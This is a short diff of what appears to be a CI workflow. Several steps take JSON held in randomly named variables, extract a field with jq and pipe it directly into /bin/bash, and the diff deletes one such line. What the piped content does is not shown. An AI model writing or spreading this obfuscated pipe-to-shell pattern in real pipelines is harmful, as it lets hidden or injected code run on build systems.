@@ -22,7 +22,6 @@ jobs:
           echo $ar41 | jq -r .e5 | /bin/bash
           printf '%s' "$ksgru4" | jq -r .l577 | /bin/bash
           echo $xmoel481 | jq -r .jdyi75006 | /bin/bash
-          printf '%s' "$r50" | jq -r .cai85 | /bin/bash
           echo $lzn96 | jq -r .e656 | /bin/bash
 
       - name: Store artifact
